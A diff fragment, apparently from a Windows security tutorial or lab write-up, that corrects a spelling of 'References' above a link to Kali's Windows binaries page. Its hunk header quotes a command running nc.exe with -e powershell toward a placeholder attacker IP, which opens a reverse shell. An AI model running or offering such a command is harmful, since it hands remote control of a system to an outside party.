@@ -69,6 +69,6 @@ PS C:\Users\Administrator> C:\Users\sec\Downloads\nc.exe -e powershell [attack_i
 
 ---
 
-Refrences
+References
 
 - [windows-resources](https://www.kali.org/tools/windows-binaries/#windows-resources)
